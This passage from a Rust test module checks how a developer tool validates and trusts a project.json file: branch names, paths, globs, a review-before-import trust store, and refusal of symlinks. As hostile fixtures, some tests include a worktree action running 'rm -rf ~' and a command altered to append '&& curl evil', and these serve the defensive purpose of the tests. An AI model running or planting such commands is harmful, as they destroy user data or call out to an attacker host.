                r#"{"version":1,"worktrees":{"buildOutput":["../elsewhere"]}}"#,
                "relative path",
            ),
            (
                r#"{"version":1,"worktrees":{"buildOutput":["/tmp"]}}"#,
                "relative path",
            ),
            (
                r#"{"version":1,"worktrees":{"regenerable":["../x"]}}"#,
                "worktrees.regenerable",
            ),
            (r#"{"version":1,"mainBranch":"--force"}"#, "mainBranch"),
            (r#"{"version":1,"mainBranch":"a..b"}"#, "mainBranch"),
            (r#"{"version":1,"mainBranch":"main branch"}"#, "mainBranch"),
            ("not json", "project.json"),
        ];
        for (text, expected) in cases {
            let error = parse(text).unwrap_err();
            assert!(
                error.contains(expected),
                "{text}: expected {expected:?} in {error:?}"
            );
        }
    }

    #[test]
    fn this_repositorys_project_file_is_valid() {
        let file = parse(include_str!("../../.monocode/project.json")).unwrap();
        let ids: Vec<&str> = file.actions.iter().map(|a| a.id.as_str()).collect();
        assert_eq!(ids, ["setup", "dev", "check", "harsh", "benchmark", "ship"]);
        let setup = file.setup_action().unwrap();
        assert_eq!(setup.command, "node scripts/setup-worktree.mjs");
        assert!(setup.hold);
        assert!(file.action("dev").unwrap().long_running);
        assert_eq!(
            file.action("harsh").unwrap().command,
            "node scripts/hub-harsh.mjs"
        );
        // The benchmark's action is the self-check, the one that needs no agent: a scheduled agent replay is
        // `node scripts/hub-bench.mjs --replay --driver claude` and never a button a person presses by accident.
        assert_eq!(
            file.action("benchmark").unwrap().command,
            "node scripts/hub-bench.mjs --check"
        );
        let ship = file.action("ship").unwrap();
        assert_eq!(ship.command, "npm run hub:ship");
        assert!(ship.confirm.is_some());
        assert_eq!(file.build_output(), vec!["target", "node_modules", "dist"]);
        assert_eq!(file.worktrees.regenerable, vec![".identity-baseline.json"]);
        // The verify stage's own recipe (verify_stage.rs): the repo's checks, then the live bench for what Ash sees.
        assert_eq!(file.verify.checks.len(), 1);
        assert_eq!(file.verify.checks[0].command, "npm run check");
        let real = file.verify.real_path.as_ref().unwrap();
        assert_eq!(real.command, "npm run hub:verify-live");
        assert_eq!(real.applies_to, vec!["src/**", "src-tauri/**"]);
    }

    #[test]
    fn main_branch_names_are_plain_git_branches() {
        let file = parse(r#"{"version":1,"mainBranch":"pm/pages-live"}"#).unwrap();
        assert_eq!(file.main_branch.as_deref(), Some("pm/pages-live"));
        assert_eq!(parse(r#"{"version":1}"#).unwrap().main_branch, None);
        for good in ["main", "pm/pages-live", "release-1.2", "a_b/c"] {
            assert!(valid_branch_name(good), "{good}");
        }
        for bad in [
            "", "-x", "/x", "x/", "a//b", "a..b", ".hidden", "a/.b", "x.lock", "x.", "a b", "a~b",
            "a:b", "a^b", "a\\b",
        ] {
            assert!(!valid_branch_name(bad), "{bad}");
        }
    }

    #[test]
    fn relative_paths_stay_inside_the_checkout() {
        assert!(valid_relative_path("target"));
        assert!(valid_relative_path("src-tauri/target"));
        for bad in ["", "..", "a/../b", "/abs", "./a", "a\\b", "a/./b"] {
            assert!(!valid_relative_path(bad), "{bad}");
        }
    }

    #[test]
    fn a_verify_block_is_parsed_and_checked() {
        let file = parse(
            r#"{"version":1,"verify":{
              "checks":[{"id":"web","name":"Web checks","command":"npx tsc --noEmit","timeoutSeconds":600}],
              "realPath":{"command":"node scripts/verify.mjs","appliesTo":["src/**","*.html"],"timeoutSeconds":300}
            }}"#,
        )
        .unwrap();
        assert_eq!(file.verify.checks.len(), 1);
        assert_eq!(file.verify.checks[0].timeout_seconds(), 600);
        assert_eq!(file.verify.checks[0].id, "web");
        let real = file.verify.real_path.unwrap();
        assert_eq!(real.timeout_seconds(), 300);
        assert_eq!(real.applies_to, vec!["src/**", "*.html"]);
        // The defaults: no checks, no real path, and a check without a timeout gets the action default.
        let bare = parse(r#"{"version":1}"#).unwrap();
        assert!(bare.verify.checks.is_empty());
        assert!(bare.verify.real_path.is_none());
        let check =
            parse(r#"{"version":1,"verify":{"checks":[{"id":"a","name":"A","command":"x"}]}}"#)
                .unwrap();
        assert_eq!(
            check.verify.checks[0].timeout_seconds(),
            DEFAULT_TIMEOUT_SECONDS
        );
    }

    #[test]
    fn refuses_verify_blocks_that_would_do_something_unexpected() {
        let cases = [
            (
                r#"{"version":1,"verify":{"checks":[{"id":"Web","name":"A","command":"x"}]}}"#,
                "lowercase",
            ),
            (
                r#"{"version":1,"verify":{"checks":[{"id":"a","name":"A","command":"x"},{"id":"a","name":"B","command":"y"}]}}"#,
                "used twice",
            ),
            (
                r#"{"version":1,"verify":{"checks":[{"id":"a","name":"A\nB","command":"x"}]}}"#,
                "one line",
            ),
            (
                r#"{"version":1,"verify":{"checks":[{"id":"a","name":"A","command":"x","timeoutSeconds":0}]}}"#,
                "timeoutSeconds",
            ),
            (
                r#"{"version":1,"verify":{"realPath":{"command":"x","appliesTo":["../elsewhere"]}}}"#,
                "relative glob",
            ),
            (
                r#"{"version":1,"verify":{"realPath":{"command":"x","appliesTo":["/abs/**"]}}}"#,
                "relative glob",
            ),
            (
                r#"{"version":1,"verify":{"realPath":{"command":"x","appliesTo":["a//b"]}}}"#,
                "relative glob",
            ),
            (
                r#"{"version":1,"verify":{"realPath":{"command":"x","timeoutSeconds":99999999}}}"#,
                "timeoutSeconds",
            ),
            (
                r#"{"version":1,"verify":{"realPath":{"command":"x","surprise":true}}}"#,
                "unknown field",
            ),
        ];
        for (text, expected) in cases {
            let error = parse(text).unwrap_err();
            assert!(
                error.contains(expected),
                "{text}: expected {expected:?} in {error:?}"
            );
        }
        let too_many = format!(
            r#"{{"version":1,"verify":{{"checks":[{}]}}}}"#,
            (0..MAX_VERIFY_CHECKS + 1)
                .map(|n| format!(r#"{{"id":"c{n}","name":"C","command":"x"}}"#))
                .collect::<Vec<_>>()
                .join(",")
        );
        assert!(parse(&too_many).unwrap_err().contains("verify.checks"));
    }

    #[test]
    fn verify_globs_stay_inside_the_checkout() {
        for good in ["src/**", "*.html", "src-tauri/src/*.rs", "a", "**/*.ts"] {
            assert!(valid_glob(good), "{good}");
        }
        for bad in ["", "..", "a/../b", "/abs", "a\\b", "a/./b", "a//b", "./a"] {
            assert!(!valid_glob(bad), "{bad}");
        }
    }

    #[test]
    fn a_damaged_trust_store_is_never_saved_over() {
        let temp = temp("monocode-trust-damaged");
        let main = repo(&temp.0);
        write_file(&main, GOOD);
        let data = temp.0.join("data");
        std::fs::create_dir_all(&data).unwrap();
        let store = data.join(TRUST_FILE);
        std::fs::write(
            &store,
            b"{\"version\":1,\"projects\":{\"/other\": {\"hash\"",
        )
        .unwrap();
        let hash = status(&data, &main).file_hash.unwrap();
        let error = import(&data, &main, &hash).unwrap_err();
        assert!(error.contains(TRUST_FILE), "{error}");
        assert!(forget(&data, &main).is_err());
        assert_eq!(
            std::fs::read(&store).unwrap(),
            b"{\"version\":1,\"projects\":{\"/other\": {\"hash\"",
            "the other projects' imports are still there to recover"
        );
        assert!(trusted_file(&data, &main).is_none(), "and nothing runs");
        // A missing store is simply empty.
        std::fs::remove_file(&store).unwrap();
        import(&data, &main, &hash).unwrap();
        assert!(trusted_file(&data, &main).is_some());
    }

    #[test]
    fn saves_at_the_same_time_each_land_whole() {
        let temp = temp("monocode-trust-concurrent");
        let data = temp.0.clone();
        let threads: Vec<_> = (0..8)
            .map(|thread| {
                let data = data.clone();
                std::thread::spawn(move || {
                    for round in 0..40 {
                        let mut store = TrustStore {
                            version: 1,
                            ..TrustStore::default()
                        };
                        store.projects.insert(
                            format!("/p{thread}"),
                            Trusted {
                                hash: format!("{round}"),
                                text: "{}".into(),
                                imported_at: 0,
                            },
                        );
                        save_store(&data, &store)?;
                    }
                    Ok::<(), String>(())
                })
            })
            .collect();
        for thread in threads {
            thread.join().unwrap().unwrap();
        }
        assert!(load_store(&data).is_ok());
        let leftovers: Vec<_> = std::fs::read_dir(&data)
            .unwrap()
            .filter_map(|entry| entry.ok())
            .map(|entry| entry.file_name().to_string_lossy().into_owned())
            .filter(|name| name != TRUST_FILE)
            .collect();
        assert!(leftovers.is_empty(), "{leftovers:?}");
    }

    fn write_file(root: &Path, text: &str) {
        std::fs::create_dir_all(root.join(PROJECT_DIR)).unwrap();
        std::fs::write(root.join(PROJECT_FILE), text).unwrap();
    }

    #[test]
    fn reads_only_the_main_checkout_and_runs_only_the_imported_copy() {
        let temp = temp("monocode-project-file");
        let main = repo(&temp.0);
        let data = temp.0.join("data");
        // A worktree carries its own (hostile) file; the main checkout has the real one.
        let tree = temp.0.join("tree");
        git_checked(
            &main,
            &["worktree", "add", "-b", "feature", tree.to_str().unwrap()],
        )
        .unwrap();
        write_file(
            &tree,
            r#"{"version":1,"actions":[{"id":"evil","name":"Evil","command":"rm -rf ~"}]}"#,
        );
        assert_eq!(main_checkout(&tree).unwrap(), main);
        assert_eq!(
            read_main_file(&main_checkout(&tree).unwrap()),
            FileState::Missing
        );
        assert_eq!(status(&data, &main).state, "none");

        write_file(&main, GOOD);
        let first = status(&data, &main);
        assert_eq!(first.state, "new");
        assert!(
            trusted_file(&data, &main).is_none(),
            "nothing runs before an import"
        );
        let reviewed = first.file_hash.clone().unwrap();

        // The file changes between review and import: refused.
        write_file(
            &main,
            &GOOD.replace("npm run check", "npm run check && curl evil"),
        );
        assert!(import(&data, &main, &reviewed)
            .unwrap_err()
            .contains("changed since you reviewed"));
        write_file(&main, GOOD);
        import(&data, &main, &reviewed).unwrap();
        let imported = status(&data, &main);
        assert_eq!(imported.state, "trusted");
        assert_eq!(imported.trusted, Some(parse(GOOD).unwrap()));

        // A later edit (or another branch checked out in main) changes nothing until it is imported again.
        write_file(
            &main,
            &GOOD.replace("npm run check", "npm run check && curl evil"),
        );
        let changed = status(&data, &main);
        assert_eq!(changed.state, "changed");
        assert_eq!(
            trusted_file(&data, &main)
                .unwrap()
                .action("check")
                .unwrap()
                .command,
            "npm run check"
        );
        std::fs::remove_file(main.join(PROJECT_FILE)).unwrap();
        let removed = status(&data, &main);
        assert_eq!(removed.state, "changed");
        assert!(removed.error.unwrap().contains("no longer"));
        forget(&data, &main).unwrap();
        assert_eq!(status(&data, &main).state, "none");
    }

    #[cfg(unix)]
    #[test]
    fn refuses_a_project_file_reached_through_a_symbolic_link() {
        let temp = temp("monocode-project-link");
        let main = repo(&temp.0);
        let outside = temp.0.join("outside");
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("project.json"), GOOD).unwrap();
        std::os::unix::fs::symlink(&outside, main.join(PROJECT_DIR)).unwrap();
        assert!(matches!(
            read_main_file(&main),
            FileState::Invalid { ref error, .. } if error.contains("symbolic link")
        ));
        std::fs::remove_file(main.join(PROJECT_DIR)).unwrap();
        std::fs::create_dir_all(main.join(PROJECT_DIR)).unwrap();
        std::os::unix::fs::symlink(outside.join("project.json"), main.join(PROJECT_FILE)).unwrap();
        assert!(matches!(
            read_main_file(&main),
            FileState::Invalid { ref error, .. } if error.contains("symbolic link")
        ));
        assert!(import(&temp.0.join("data"), &main, &hash(GOOD.as_bytes())).is_err());
    }
}
